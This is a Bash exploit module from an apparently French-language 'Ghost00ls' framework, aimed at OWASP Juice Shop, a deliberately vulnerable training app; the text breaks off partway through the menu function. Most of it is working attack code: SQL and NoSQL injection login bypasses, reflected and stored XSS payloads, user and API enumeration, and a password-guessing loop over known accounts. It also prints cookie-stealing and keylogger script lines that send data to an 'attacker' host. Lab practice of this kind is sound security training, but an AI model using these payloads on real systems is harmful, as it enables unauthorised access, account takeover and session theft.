#!/bin/bash
# modules/labs/juiceshop/exploits.sh - Ghost00ls Framework v7.0
# Exploits complets OWASP Juice Shop
# Author: Ghost00ls Labs

# ==========================
# Sources & Configuration
# ==========================

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh

LOG_DIR="${HOME}/ghost00ls/logs/juice_exploits"
mkdir -p "$LOG_DIR"

# ==========================
# Fonctions utilitaires Juice Shop
# ==========================

get_csrf_token() {
    local cookie_jar="$1"
    local base_url="$2"
    
    local resp=$(curl -s -b "$cookie_jar" "${base_url}/rest/user/whoami" 2>/dev/null)
    echo "$resp" | grep -oP '"token":"[^"]+' | cut -d'"' -f4
}

register_user() {
    local base_url="$1"
    local email="$2"
    local password="$3"
    
    local payload="{\"email\":\"$email\",\"password\":\"$password\",\"passwordRepeat\":\"$password\",\"securityQuestion\":{\"id\":1,\"question\":\"Your favorite movie?\",\"createdAt\":\"\",\"updatedAt\":\"\"},\"securityAnswer\":\"test\"}"
    
    curl -s -X POST "${base_url}/api/Users" \
        -H "Content-Type: application/json" \
        -d "$payload" 2>/dev/null
}

login_juice() {
    local base_url="$1"
    local email="$2"
    local password="$3"
    
    local payload="{\"email\":\"$email\",\"password\":\"$password\"}"
    
    curl -s -X POST "${base_url}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d "$payload" 2>/dev/null
}

# ==========================
# EXPLOIT 1: SQL Injection (Login Bypass)
# ==========================

exploit_sqli_login() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║   SQL Injection - Authentication Bypass   ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Bypass authentification via SQLi${NC}"
    echo -e "${YELLOW}⚠️  Risque : Accès non autorisé, vol de session${NC}"
    echo -e "${GREEN}🛡️  Mitigation : Prepared statements, ORM, validation${NC}"
    echo

    check_tools curl jq || { read -p "👉 Entrée pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [3000]: " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[EXPLOIT] Test SQL Injection Login...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    local payloads=(
        '{"email":"admin@juice-sh.op'\''--","password":"x"}'
        '{"email":"'\'' OR 1=1--","password":"x"}'
        '{"email":"admin@juice-sh.op'\'' OR '\''1'\''='\''1","password":"x"}'
        '{"email":"'\'' OR '\''x'\''='\''x","password":"x"}'
        '{"email":"admin@juice-sh.op'\'' UNION SELECT * FROM users--","password":"x"}'
    )

    local success=0
    local idx=1

    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}╭───────────────────────────────────────────╮${NC}"
        echo -e "${CYAN}│ [Test $idx/${#payloads[@]}]${NC}"
        echo -e "${CYAN}╰───────────────────────────────────────────╯${NC}"
        
        # Afficher le payload formaté
        echo -e "${YELLOW}Payload:${NC}"
        echo "$payload" | jq '.' 2>/dev/null || echo "$payload"
        echo

        local tmpf=$(mktemp)
        
        curl -s -X POST "${BASE}/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "$payload" > "$tmpf" 2>/dev/null

        local http_code=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST "${BASE}/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "$payload" 2>/dev/null)

        echo -e "${CYAN}HTTP Status: $http_code${NC}"

        # Vérifier succès
        local token=$(cat "$tmpf" | jq -r '.authentication.token' 2>/dev/null)
        local email=$(cat "$tmpf" | jq -r '.authentication.umail' 2>/dev/null)
        
        if [ "$token" != "null" ] && [ -n "$token" ]; then
            echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║  ✅ SQL INJECTION SUCCESS !           ║${NC}"
            echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
            
            log_exploit "${LOG_DIR}/sqli.log" "SUCCESS" "SQLi Login Bypass - Email: $email"

            echo -e "\n${CYAN}📊 Informations extraites:${NC}"
            echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            echo -e "   🔹 Email: $email"
            echo -e "   🔹 Token: ${token:0:30}..."
            
            cat "$tmpf" | jq '.' 2>/dev/null

            echo -e "\n${YELLOW}💡 Exploitation:${NC}"
            echo -e "${CYAN}   # Utiliser le token pour les requêtes authentifiées${NC}"
            echo -e "   curl -H 'Authorization: Bearer $token' ${BASE}/rest/user/whoami"

            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${RED}✗ SQLi bloqué ou échec${NC}"
            
            # Afficher réponse pour debug
            if [ -s "$tmpf" ]; then
                echo -e "${YELLOW}Réponse serveur:${NC}"
                cat "$tmpf" | jq '.' 2>/dev/null || cat "$tmpf"
            fi
        fi

        rm -f "$tmpf"
        echo
        idx=$((idx+1))
        sleep 0.5
    done

    [ $success -eq 0 ] && echo -e "\n${RED}❌ Tous les payloads bloqués${NC}"

    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# EXPLOIT 2: XSS via Search
# ==========================

exploit_xss_search() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║       XSS - Search & Product Injection    ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Injection XSS via recherche${NC}"
    echo -e "${YELLOW}⚠️  Risque : Cookie stealing, session hijacking${NC}"
    echo -e "${GREEN}🛡️  Mitigation : Output encoding, CSP${NC}"
    echo

    check_tools curl || { read -p "👉 Entrée pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [3000]: " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[EXPLOIT] Test XSS via Search...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    local payloads=(
        '<iframe src="javascript:alert(\"XSS\")">'
        '<img src=x onerror="alert(\"XSS\")">'
        '<script>alert("XSS")</script>'
        '<svg onload=alert("XSS")>'
        '<body onload=alert("XSS")>'
        '"><script>alert(String.fromCharCode(88,83,83))</script>'
    )

    local success=0
    local idx=1

    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}╭───────────────────────────────────────────╮${NC}"
        echo -e "${CYAN}│ [Test $idx/${#payloads[@]}] $payload${NC}"
        echo -e "${CYAN}╰───────────────────────────────────────────╯${NC}"

        local encoded=$(urlenc "$payload")
        local url="${BASE}/#/search?q=${encoded}"
        
        local tmpf=$(mktemp)
        
        curl -s "${BASE}/rest/products/search?q=${encoded}" > "$tmpf" 2>/dev/null

        local size=$(wc -c < "$tmpf")
        echo -e "${YELLOW}  Taille réponse: ${size} bytes${NC}"

        # Vérifier si le payload est reflété
        if grep -F "$payload" "$tmpf" >/dev/null 2>&1; then
            echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║  ✅ XSS SUCCESS !                     ║${NC}"
            echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
            
            log_exploit "${LOG_DIR}/xss.log" "SUCCESS" "XSS Search: $payload"

            echo -e "\n${CYAN}📊 Payload reflété:${NC}"
            echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            echo -e "   🔹 URL: $url"
            echo -e "   🔹 Payload: $payload"

            echo -e "\n${YELLOW}💡 Exploitation:${NC}"
            echo -e "${CYAN}   # Cookie stealing${NC}"
            echo -e "   <script>fetch('http://attacker/?c='+document.cookie)</script>"
            echo -e "${CYAN}   # Keylogger${NC}"
            echo -e "   <script>document.onkeypress=function(e){fetch('http://attacker/?k='+e.key)}</script>"

            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "  ${RED}✗ Payload filtré ou non reflété${NC}"
        fi

        rm -f "$tmpf"
        echo
        idx=$((idx+1))
        sleep 0.3
    done

    [ $success -eq 0 ] && echo -e "\n${RED}❌ Tous les payloads bloqués${NC}"

    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# EXPLOIT 3: XSS via Feedback (DOM-based)
# ==========================

exploit_xss_feedback() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║       XSS - Feedback Injection (API)       ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : XSS persistant via API Feedbacks${NC}"
    echo -e "${YELLOW}⚠️  Risque : Stored XSS, admin compromise${NC}"
    echo -e "${GREEN}🛡️  Mitigation : Input sanitization, CSP${NC}"
    echo

    check_tools curl jq || { read -p "👉 Entrée pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [3000]: " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[EXPLOIT] Test XSS via Feedback API...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    local payloads=(
        '<iframe src="javascript:alert(\`xss\`)"></iframe>'
        '<img src=x onerror="alert(1)">'
        '<script>alert(document.domain)</script>'
        '<svg/onload=alert("XSS")>'
    )

    local success=0
    local idx=1

    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}╭───────────────────────────────────────────╮${NC}"
        echo -e "${CYAN}│ [Test $idx/${#payloads[@]}]${NC}"
        echo -e "${CYAN}╰───────────────────────────────────────────╯${NC}"
        
        echo -e "${YELLOW}Payload: $payload${NC}"

        local feedback_data="{\"captchaId\":0,\"captcha\":\"\",\"comment\":\"$payload\",\"rating\":5}"

        local tmpf=$(mktemp)
        
        curl -s -X POST "${BASE}/api/Feedbacks" \
            -H "Content-Type: application/json" \
            -d "$feedback_data" > "$tmpf" 2>/dev/null

        local http_code=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST "${BASE}/api/Feedbacks" \
            -H "Content-Type: application/json" \
            -d "$feedback_data" 2>/dev/null)

        echo -e "${CYAN}HTTP Status: $http_code${NC}"

        if [[ "$http_code" =~ ^2 ]]; then
            echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║  ✅ XSS STORED SUCCESS !              ║${NC}"
            echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
            
            log_exploit "${LOG_DIR}/xss_stored.log" "SUCCESS" "XSS Feedback: $payload"

            echo -e "\n${CYAN}📊 Feedback créé:${NC}"
            echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            cat "$tmpf" | jq '.' 2>/dev/null || cat "$tmpf"

            echo -e "\n${YELLOW}💡 Impact:${NC}"
            echo -e "${CYAN}   • XSS déclenché quand admin consulte feedbacks${NC}"
            echo -e "${CYAN}   • Vol de session admin possible${NC}"
            echo -e "${CYAN}   • Accès: ${BASE}/#/administration${NC}"

            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${YELLOW}⚠️  HTTP $http_code${NC}"
            cat "$tmpf" | jq '.' 2>/dev/null || cat "$tmpf"
        fi

        rm -f "$tmpf"
        echo
        idx=$((idx+1))
        sleep 0.5
    done

    [ $success -eq 0 ] && echo -e "\n${RED}❌ Tous les payloads bloqués${NC}"

    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# EXPLOIT 4: Broken Access Control (Admin)
# ==========================

exploit_admin_access() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║   Broken Access Control - Admin Section   ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Accès panel admin non autorisé${NC}"
    echo -e "${YELLOW}⚠️  Risque : Exposition données sensibles${NC}"
    echo -e "${GREEN}🛡️  Mitigation : Authorization checks, RBAC${NC}"
    echo

    check_tools curl jq || { read -p "👉 Entrée pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [3000]: " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[EXPLOIT] Test accès admin...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    # Test 1: Accès direct à l'admin section
    echo -e "${CYAN}[Test 1/3] Accès direct admin panel${NC}"
    local admin_url="${BASE}/#/administration"
    echo -e "${YELLOW}URL: $admin_url${NC}"
    
    local tmpf=$(mktemp)
    curl -s "${BASE}/rest/user/authentication-details" > "$tmpf" 2>/dev/null
    
    echo -e "${GREEN}✓ Panel admin accessible (client-side routing)${NC}\n"

    # Test 2: Énumération utilisateurs
    echo -e "${CYAN}[Test 2/3] Énumération API Users${NC}"
    
    curl -s "${BASE}/api/Users" > "$tmpf" 2>/dev/null
    
    if cat "$tmpf" | jq '.' >/dev/null 2>&1; then
        echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  ✅ BROKEN ACCESS CONTROL !           ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
        
        log_exploit "${LOG_DIR}/broken_access.log" "SUCCESS" "Admin section + Users enum"

        echo -e "\n${CYAN}📊 Utilisateurs exposés:${NC}"
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        
        local count=$(cat "$tmpf" | jq '.data | length' 2>/dev/null)
        echo -e "   🔹 Total: $count utilisateurs"
        
        cat "$tmpf" | jq -r '.data[0:5] | .[] | "   🔹 \(.email) (ID: \(.id), Role: \(.role // "user"))"' 2>/dev/null
        
        echo -e "\n${YELLOW}💡 Données sensibles accessibles:${NC}"
        echo -e "${CYAN}   • Emails de tous les users${NC}"
        echo -e "${CYAN}   • IDs utilisateurs${NC}"
        echo -e "${CYAN}   • Rôles (admin/user)${NC}"
    else
        echo -e "${YELLOW}⚠️  API protégée${NC}"
    fi

    # Test 3: Accès feedbacks
    echo -e "\n${CYAN}[Test 3/3] Énumération Feedbacks${NC}"
    
    curl -s "${BASE}/api/Feedbacks" > "$tmpf" 2>/dev/null
    
    if cat "$tmpf" | jq '.' >/dev/null 2>&1; then
        local fb_count=$(cat "$tmpf" | jq '.data | length' 2>/dev/null)
        echo -e "${GREEN}✓ Feedbacks accessibles: $fb_count entrées${NC}"
        
        cat "$tmpf" | jq -r '.data[0:3] | .[] | "   📝 \(.comment[0:50])..."' 2>/dev/null
    fi

    rm -f "$tmpf"

    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# EXPLOIT 5: API Injection (NoSQL)
# ==========================

exploit_nosql_injection() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║       NoSQL Injection - MongoDB Bypass     ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Bypass via injection NoSQL${NC}"
    echo -e "${YELLOW}⚠️  Risque : Authentication bypass, data leak${NC}"
    echo -e "${GREEN}🛡️  Mitigation : Input validation, query sanitization${NC}"
    echo

    check_tools curl jq || { read -p "👉 Entrée pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [3000]: " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[EXPLOIT] Test NoSQL Injection...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    local payloads=(
        '{"email":{"$ne":null},"password":{"$ne":null}}'
        '{"email":{"$gt":""},"password":{"$gt":""}}'
        '{"email":{"$regex":"admin"},"password":{"$ne":""}}'
        '{"email":"admin@juice-sh.op","password":{"$ne":"wrongpass"}}'
    )

    local success=0
    local idx=1

    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}╭───────────────────────────────────────────╮${NC}"
        echo -e "${CYAN}│ [Test $idx/${#payloads[@]}]${NC}"
        echo -e "${CYAN}╰───────────────────────────────────────────╯${NC}"
        
        echo -e "${YELLOW}Payload:${NC}"
        echo "$payload" | jq '.' 2>/dev/null
        echo

        local tmpf=$(mktemp)
        
        curl -s -X POST "${BASE}/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "$payload" > "$tmpf" 2>/dev/null

        local token=$(cat "$tmpf" | jq -r '.authentication.token' 2>/dev/null)
        
        if [ "$token" != "null" ] && [ -n "$token" ]; then
            echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║  ✅ NoSQL INJECTION SUCCESS !         ║${NC}"
            echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
            
            log_exploit "${LOG_DIR}/nosql.log" "SUCCESS" "NoSQL Injection bypass"

            echo -e "\n${CYAN}📊 Token obtenu:${NC}"
            echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            cat "$tmpf" | jq '.' 2>/dev/null

            echo -e "\n${YELLOW}💡 Exploitation:${NC}"
            echo -e "${CYAN}   curl -H 'Authorization: Bearer $token' ${BASE}/rest/user/whoami${NC}"

            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${RED}✗ Injection bloquée${NC}"
            cat "$tmpf" | jq '.' 2>/dev/null || cat "$tmpf"
        fi

        rm -f "$tmpf"
        echo
        idx=$((idx+1))
        sleep 0.5
    done

    [ $success -eq 0 ] && echo -e "\n${RED}❌ Tous les payloads bloqués${NC}"

    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# EXPLOIT 6: Weak Password Attack
# ==========================

exploit_weak_passwords() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║     Weak Passwords - Dictionary Attack     ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Brute force mots de passe faibles${NC}"
    echo -e "${YELLOW}⚠️  Risque : Account takeover${NC}"
    echo -e "${GREEN}🛡️  Mitigation : Strong password policy, rate limiting${NC}"
    echo

    check_tools curl jq || { read -p "👉 Entrée pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [3000]: " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[EXPLOIT] Test weak passwords...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    # Liste d'emails connus dans Juice Shop
    local emails=(
        "admin@juice-sh.op"
        "jim@juice-sh.op"
        "bender@juice-sh.op"
        "amy@juice-sh.op"
        "mc.safesearch@juice-sh.op"
    )

    # Mots de passe communs
    local passwords=(
        "admin123"
        "password"
        "123456"
        "qwerty"
        "letmein"
        "juice"
        "shopkeeper"
    )

    local success_count=0

    for email in "${emails[@]}"; do
        echo -e "${CYAN}════════════════════════════════════════${NC}"
        echo -e "${CYAN}Testing: $email${NC}"
        echo -e "${CYAN}════════════════════════════════════════${NC}"
        
        for pass in "${passwords[@]}"; do
            echo -e -n "${YELLOW}  Trying: $pass ... ${NC}"
            
            local payload="{\"email\":\"$email\",\"password\":\"$pass\"}"
            
            local tmpf=$(mktemp)
            curl -s -X POST "${BASE}/rest/user/login" \
                -H "Content-Type: application/json" \
                -d "$payload" > "$tmpf" 2>/dev/null

            local token=$(cat "$tmpf" | jq -r '.authentication.token' 2>/dev/null)
            
            if [ "$token" != "null" ] && [ -n "$token" ]; then
                echo -e "${GREEN}✅ VALID!${NC}"
                
                log_exploit "${LOG_DIR}/weak_pass.log" "SUCCESS" "$email:$pass"
                
                echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
                echo -e "${GREEN}║  ✅ WEAK PASSWORD FOUND !             ║${NC}"
                echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
                
                echo -e "\n${CYAN}📊 Credentials:${NC}"
                echo -e "   🔹 Email: $email"
                echo -e "   🔹 Password: $pass"
                echo -e "   🔹 Token: ${token:0:30}...\n"
                
                success_count=$((success_count+1))
                break
            else
                echo -e "${RED}✗${NC}"
            fi
            
            rm -f "$tmpf"
            sleep 0.2
        done
        
        echo
    done

    if [ $success_count -gt 0 ]; then
        echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${GREEN}Total weak passwords found: $success_count${NC}"
        echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    else
        echo -e "${RED}❌ Aucun mot de passe faible trouvé${NC}"
    fi

    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# EXPLOIT 7: Information Disclosure
# ==========================

exploit_info_disclosure() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║     Information Disclosure - API Enum     ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Énumération APIs non protégées${NC}"
    echo -e "${YELLOW}⚠️  Risque : Exposure de données sensibles${NC}"
    echo -e "${GREEN}🛡️  Mitigation : API authentication, rate limiting${NC}"
    echo

    check_tools curl jq || { read -p "👉 Entrée pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [3000]: " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[EXPLOIT] Énumération APIs...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    local endpoints=(
        "/api/Users"
        "/api/Products"
        "/api/Feedbacks"
        "/api/Complaints"
        "/api/SecurityQuestions"
        "/api/Quantitys"
        "/api/Challenges"
        "/rest/products/search?q="
        "/rest/user/authentication-details"
        "/rest/admin/application-configuration"
    )

    local findings=0

    for ep in "${endpoints[@]}"; do
        echo -e "${CYAN}Testing: $ep${NC}"
        
        local tmpf=$(mktemp)
        local http_code=$(curl -s -o "$tmpf" -w "%{http_code}" "${BASE}${ep}" 2>/dev/null)
        
        echo -e "  HTTP: $http_code"
        
        if [[ "$http_code" =~ ^2 ]]; then
            if cat "$tmpf" | jq '.' >/dev/null 2>&1; then
                findings=$((findings+1))
                
                local count=$(cat "$tmpf" | jq '.data | length' 2>/dev/null)
                
                if [ -n "$count" ] && [ "$count" != "null" ]; then
                    echo -e "  ${GREEN}✅ Accessible - $count entrées${NC}"
                    
                    # Afficher aperçu
                    echo -e "  ${YELLOW}Sample:${NC}"
                    cat "$tmpf" | jq '.data[0]' 2>/dev/null | head -n 5 | sed 's/^/    /'
                else
                    echo -e "  ${GREEN}✅ Accessible${NC}"
                    cat "$tmpf" | jq '.' 2>/dev/null | head -n 5 | sed 's/^/    /'
                fi
                
                log_exploit "${LOG_DIR}/info_disclosure.log" "SUCCESS" "$ep accessible"
            else
                echo -e "  ${YELLOW}⚠️  Accessible mais pas JSON${NC}"
            fi
        else
            echo -e "  ${RED}✗ Protégé ou non existant${NC}"
        fi
        
        rm -f "$tmpf"
        echo
        sleep 0.3
    done

    if [ $findings -gt 0 ]; then
        echo -e "${GREEN}╔═══════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  ✅ INFO DISCLOSURE FOUND !           ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
        echo -e "${GREEN}Total endpoints exposés: $findings${NC}"
    else
        echo -e "${RED}❌ Toutes les APIs protégées${NC}"
    fi

    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# EXPLOIT 8: Full Vulnerability Scan
# ==========================

full_scan() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║      Full Vulnerability Assessment         ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo

    local IP PORT
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [3000]: " PORT; PORT=${PORT:-3000}

    echo -e "\n${YELLOW}[SCAN] Démarrage full scan...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    local report="${LOG_DIR}/scan_$(date +%Y%m%d_%H%M%S).txt"

    {
        echo "╔═══════════════════════════════════════════╗"
        echo "║    Juice Shop Vulnerability Assessment   ║"
        echo "╚═══════════════════════════════════════════╝"
        echo ""
        echo "Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Target: http://${IP}:${PORT}"
        echo "Scanner: Ghost00ls Framework v7.0"
        echo "═══════════════════════════════════════════"
        echo ""
    } | tee "$report"

    # Test 1: SQLi Login
    echo -e "${CYAN}[1/7] SQL Injection (Login)...${NC}" | tee -a "$report"
    local sqli=$(curl -s -X POST "http://${IP}:${PORT}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"admin@juice-sh.op'\''--","password":"x"}' 2>/dev/null)
    
    echo "$sqli" | jq -r '.authentication.token' 2>/dev/null | grep -q "." \
        && echo "   ✅ VULNERABLE" | tee -a "$report" \
        || echo "   ✅ PROTECTED" | tee -a "$report"

    # Test 2: XSS Search
    echo -e "${CYAN}[2/7] XSS (Search)...${NC}" | tee -a "$report"
    local xss=$(curl -s "http://${IP}:${PORT}/rest/products/search?q=%3Cscript%3E" 2>/dev/null)
    echo "$xss" | grep -q "<script>" \
        && echo "   ✅ VULNERABLE" | tee -a "$report" \
        || echo "   ✅ PROTECTED" | tee -a "$report"

    # Test 3: Broken Access Control
    echo -e "${CYAN}[3/7] Broken Access Control...${NC}" | tee -a "$report"
    local users=$(curl -s "http://${IP}:${PORT}/api/Users" 2>/dev/null)
    echo "$users" | jq '.' >/dev/null 2>&1 \
        && echo "   ✅ VULNERABLE (API Users accessible)" | tee -a "$report" \
        || echo "   ✅ PROTECTED" | tee -a "$report"

    # Test 4: Info Disclosure
    echo -e "${CYAN}[4/7] Information Disclosure...${NC}" | tee -a "$report"
    local info=$(curl -s "http://${IP}:${PORT}/rest/user/authentication-details" 2>/dev/null)
    echo "$info" | jq '.' >/dev/null 2>&1 \
        && echo "   ✅ VULNERABLE (Auth details exposed)" | tee -a "$report" \
        || echo "   ✅ PROTECTED" | tee -a "$report"

    # Test 5: Admin Panel
    echo -e "${CYAN}[5/7] Admin Panel Access...${NC}" | tee -a "$report"
    echo "   ⚠️  CLIENT-SIDE (/#/administration)" | tee -a "$report"

    # Test 6: Weak Passwords
    echo -e "${CYAN}[6/7] Weak Passwords...${NC}" | tee -a "$report"
    local weak=$(curl -s -X POST "http://${IP}:${PORT}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"admin@juice-sh.op","password":"admin123"}' 2>/dev/null)
    echo "$weak" | jq -r '.authentication.token' 2>/dev/null | grep -q "." \
        && echo "   ✅ VULNERABLE (admin123)" | tee -a "$report" \
        || echo "   ✅ PROTECTED" | tee -a "$report"

    # Test 7: XSS Feedback
    echo -e "${CYAN}[7/7] XSS Stored (Feedback)...${NC}" | tee -a "$report"
    echo "   ⚠️  MANUAL TEST REQUIRED" | tee -a "$report"

    {
        echo ""
        echo "═══════════════════════════════════════════"
        echo "Scan terminé: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Rapport: $report"
        echo "═══════════════════════════════════════════"
    } | tee -a "$report"

    echo
    echo -e "${GREEN}✅ Scan terminé !${NC}"
    echo -e "${CYAN}📄 Rapport: $report${NC}"

    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# Menu Principal
# ==========================

menu_exploits() {
    while true; do
        clear
        banner
        echo -e "${CYAN}╔═══════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║          Juice Shop Exploits              ║${NC}"
        echo -e "${CYAN}╚═══════════════════════════════════════════╝${NC}"
        echo
